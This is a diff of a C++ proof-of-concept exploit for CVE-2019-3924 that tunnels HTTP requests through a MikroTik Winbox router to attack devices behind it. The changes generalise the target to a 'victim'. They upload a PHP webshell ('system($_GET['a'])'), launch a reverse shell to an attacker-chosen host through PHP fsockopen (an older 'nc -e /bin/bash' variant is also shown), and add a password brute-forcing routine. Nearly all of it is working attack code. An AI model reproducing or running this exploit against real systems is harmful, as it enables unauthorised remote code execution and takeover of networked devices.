@@ -36,35 +36,31 @@
 #include "winbox_session.hpp"
 #include "winbox_message.hpp"
 
+#include <fstream>
+#include <sstream>
+
 namespace
 {
     const char s_version[] = "CVE-2019-3924 PoC NUUO Edition v1.0";
 
-    bool parseCommandLine(int p_argCount, const char* p_argArray[],
-                          std::string& p_proxy_ip, std::string& p_proxy_port,
-                          std::string& p_target_ip, std::string& p_target_port,
-                          std::string& p_listen_ip, std::string& p_listen_port,
-                          bool& p_detect_only)
+    bool parseCommandLine(int p_argCount, const char *p_argArray[],
+                          std::string &p_proxy_ip, std::string &p_proxy_port,
+                          std::string &p_target_ip, std::string &p_target_port,
+                          std::string &p_listen_ip, std::string &p_listen_port,
+                          bool &p_detect_only)
     {
         boost::program_options::options_description description("options");
-        description.add_options()
-            ("help,h", "A list of command line options")
-            ("proxy_port", boost::program_options::value<std::string>(), "The MikroTik Winbox port to connect to")
-            ("proxy_ip", boost::program_options::value<std::string>(), "The MikroTik router to connect to")
-            ("target_port", boost::program_options::value<std::string>(), "The NVRMini port to connect to")
-            ("target_ip", boost::program_options::value<std::string>(), "The NVRMini IP to connect to")
-            ("listening_ip", boost::program_options::value<std::string>(), "The IP listening for the reverse shell")
-            ("listening_port", boost::program_options::value<std::string>(), "The port listening for the reverse shell")
-            ("detect_only,d", boost::program_options::bool_switch()->default_value(false), "Exit after detection logic");
+        description.add_options()("help,h", "A list of command line options")("proxy_port", boost::program_options::value<std::string>(), "The MikroTik Winbox port to connect to")("proxy_ip", boost::program_options::value<std::string>(), "The MikroTik router to connect to")("target_port", boost::program_options::value<std::string>(), "The NVRMini port to connect to")("target_ip", boost::program_options::value<std::string>(), "The NVRMini IP to connect to")("listening_ip", boost::program_options::value<std::string>(), "The IP listening for the reverse shell")("listening_port", boost::program_options::value<std::string>(), "The port listening for the reverse shell")("detect_only,d", boost::program_options::bool_switch()->default_value(false), "Exit after detection logic");
 
         boost::program_options::variables_map argv_map;
         try
         {
             boost::program_options::store(
                 boost::program_options::parse_command_line(
-                    p_argCount, p_argArray, description), argv_map);
+                    p_argCount, p_argArray, description),
+                argv_map);
         }
-        catch (const std::exception& e)
+        catch (const std::exception &e)
         {
             std::cerr << e.what() << std::endl;
             std::cerr << description << std::endl;
@@ -105,9 +101,9 @@ namespace
         return false;
     }
 
-    bool find_nvrmini2(Winbox_Session& session,
-                       std::string& p_address, boost::uint32_t p_converted_address,
-                       boost::uint32_t p_converted_port)
+    bool find_victim(Winbox_Session &session,
+                     std::string &p_address, boost::uint32_t p_converted_address,
+                     boost::uint32_t p_converted_port)
     {
         WinboxMessage msg;
         msg.set_to(104);
@@ -115,9 +111,8 @@ namespace
         msg.set_request_id(1);
         msg.set_reply_expected(true);
         msg.add_string(7, "GET / HTTP/1.1\r\nHost:" + p_address + "\r\nAccept:*/*\r\n\r\n"); // text to send
-        msg.add_string(8, "Network Video Recorder Login</title>"); // test to match
-        msg.add_u32(3, p_converted_address); // ip address
-        msg.add_u32(4, p_converted_port); // port
+        msg.add_u32(3, p_converted_address);                                                 // ip address
+        msg.add_u32(4, p_converted_port);                                                    // port
 
         session.send(msg);
         msg.reset();
@@ -136,8 +131,8 @@ namespace
 
         return msg.get_boolean(0xd);
     }
-    
-    bool upload_webshell(Winbox_Session& session, boost::uint32_t p_converted_address,
+
+    bool upload_webshell(Winbox_Session &session, std::string &p_address, boost::uint32_t p_converted_address,
                          boost::uint32_t p_converted_port)
     {
         WinboxMessage msg;
@@ -145,10 +140,13 @@ namespace
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:a\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
+        msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nContent-Type:multipart/form-data; boundary=b\r\n\r\n--b\r\nContent-Disposition:form-data;name=fileToUpload;filename=rsk.php\r\n\r\n<?php system($_GET['a']);?>\r\n--b\r\nContent-Disposition:form-data;name=submit\r\n\r\nUpload File\r\n--b\n");
+        //msg.add_string(7, "POST /upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nContent-Type:multipart/form-data;boundary=a\r\nContent-Length:96\r\n\r\n--a\nContent-Disposition:form-data;name=userfile;filename=a.php\n\n<?php system($_GET['a']);?>\n--a\n");
         msg.add_string(8, "200 OK");
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
+
+        std::cout << msg.serialize_to_json() << std::endl;
 
         session.send(msg);
         msg.reset();
@@ -168,19 +166,24 @@ namespace
         return msg.get_boolean(0xd);
     }
 
-    bool execute_reverse_shell(Winbox_Session& session, boost::uint32_t p_converted_address,
-                               boost::uint32_t p_converted_port, std::string& p_reverse_ip,
-                               std::string& p_reverse_port)
+    bool execute_reverse_shell(Winbox_Session &session, std::string &p_address, boost::uint32_t p_converted_address,
+                               boost::uint32_t p_converted_port, std::string &p_reverse_ip,
+                               std::string &p_reverse_port)
     {
         WinboxMessage msg;
         msg.set_to(104);
         msg.set_command(1);
         msg.set_request_id(1);
         msg.set_reply_expected(true);
-        msg.add_string(7, "GET /a.php?a=(nc%20" + p_reverse_ip + "%20" + p_reverse_port + "%20-e%20/bin/bash)%26 HTTP/1.1\r\nHost:a\r\n\r\n");
+        msg.add_string(7, "GET /rsk.php?a=php+-r+%27%24sock%3Dfsockopen%28%22"+p_reverse_ip+"%22%2C"+p_reverse_port+"%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27 HTTP/1.1\r\nHost:" + p_address + "\r\n\r\n");
+        //msg.add_string(7, "GET /rsk.php?a=ls+/bin/+%3E+logk.txt HTTP/1.1\r\nHost:" + p_address + "\r\n\r\n");
+        
         msg.add_string(8, "200 OK");
         msg.add_u32(3, p_converted_address);
         msg.add_u32(4, p_converted_port);
+
+
+        std::cout << "[+] Request:" << msg.serialize_to_json() << std::endl;
 
         session.send(msg);
         msg.reset();
@@ -190,6 +193,8 @@ namespace
             std::cerr << "Error receiving a response." << std::endl;
             return false;
         }
+        
+        std::cout << "[+] Reply:" << msg.serialize_to_json()<< std::endl;
 
         if (msg.has_error())
         {
@@ -201,7 +206,49 @@ namespace
     }
 }
 
-int main(int p_argc, const char** p_argv)
+std::string bang_passwords(Winbox_Session &session, std::string &p_address, boost::uint32_t p_converted_address,
+                           boost::uint32_t p_converted_port)
+{
+    const std::string passwordList("common_passwords.txt");
+    std::ifstream reader{};
+    reader.open(passwordList);
+
+    std::stringstream ss;
+    ss << reader.rdbuf();
+
+    std::string password;
+
+    size_t passCounter = 0;
+    while (std::getline(ss, password))
+    {
+        WinboxMessage msg;
+        msg.set_to(104);
+        msg.set_command(1);
+        msg.set_request_id(1);
+        msg.set_reply_expected(true);
+        msg.add_string(7, "POST /api_upload.php HTTP/1.1\r\nHost:" + p_address + "\r\nAccept: */*\r\nContent-Length: 328\r\nContent-Type: multipart/form-data; boundary=--------------------------37fa95b2c741544e\r\n\r\n--------------------------37fa95b2c741544e\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ps.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php system($_GET['a']);?>\r\n--------------------------37fa95b2c741544e\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n" + password + "\r\n--------------------------37fa95b2c741544e--\r\n");
+        msg.add_string(8, "200 OK");
+        msg.add_u32(3, p_converted_address);
+        msg.add_u32(4, p_converted_port);
+
+        session.send(msg);
+        msg.reset();
+
+        if (session.receive(msg))
+        {
+            std::cerr << "Valid password:" << password << std::endl;
+            return password;
+        }
+
+        std::cout << "Password #" << passCounter << ":" << password << ";" << msg.get_error_string() << std::endl;
+
+        ++passCounter;
+    }
+
+    return {};
+}
+
+int main(int p_argc, const char **p_argv)
 {
     bool detect_only = false;
     std::string proxy_ip;
@@ -211,7 +258,7 @@ int main(int p_argc, const char** p_argv)
     std::string listening_ip;
     std::string listening_port;
     if (!parseCommandLine(p_argc, p_argv, proxy_ip, proxy_port, target_ip,
-         target_port, listening_ip, listening_port, detect_only))
+                          target_port, listening_ip, listening_port, detect_only))
     {
         return EXIT_FAILURE;
     }
@@ -237,28 +284,30 @@ int main(int p_argc, const char** p_argv)
     boost::uint32_t converted_address = ntohl(inet_network(target_ip.c_str()));
     boost::uint16_t converted_port = std::stoi(target_port);
 
-    std::cout << "[+] Looking for a NUUO NVR at " << target_ip << ":" << target_port << std::endl;
-    if (!find_nvrmini2(winboxSession, target_ip, converted_address, converted_port))
+    std::cout << "[+] Looking for victim at " << target_ip << ":" << target_port << std::endl;
+    if (!find_victim(winboxSession, target_ip, converted_address, converted_port))
     {
-      std::cerr << "[-] The target isn't a NUUO NVR." << std::endl;
-      return EXIT_FAILURE;
+        return EXIT_FAILURE;
     }
-    std::cout << "[+] Found a NUUO NVR!" << std::endl;
+    std::cout << "[+] Found Victim!" << std::endl;
 
     if (detect_only)
     {
         return EXIT_SUCCESS;
     }
-    
+
+    //auto validPassword = bang_passwords(winboxSession, target_ip, converted_address, converted_port);
+
     std::cout << "[+] Uploading a webshell" << std::endl;
-    if (!upload_webshell(winboxSession, converted_address, converted_port))
+    if (!upload_webshell(winboxSession, target_ip, converted_address, converted_port))
     {
-        std::cerr << "[-] Failed to upload the shell." << std::endl;
+        std::cerr << "[-] Failed to upload a webshell." << std::endl;
         return EXIT_FAILURE;
     }
+    std::cout << "[+] Successfully uploaded a webshell" << std::endl;
 
     std::cout << "[+] Executing a reverse shell to " << listening_ip << ":" << listening_port << std::endl;
-    if (!execute_reverse_shell(winboxSession, converted_address, converted_port,
+    if (!execute_reverse_shell(winboxSession, target_ip, converted_address, converted_port,
                                listening_ip, listening_port))
     {
         std::cerr << "[-] Failed to execute the reverse shell." << std::endl;
@@ -266,7 +315,7 @@ int main(int p_argc, const char** p_argv)
     }
 
     std::cout << "[+] Done!" << std::endl;
-    
+
     return EXIT_SUCCESS;
 }
 
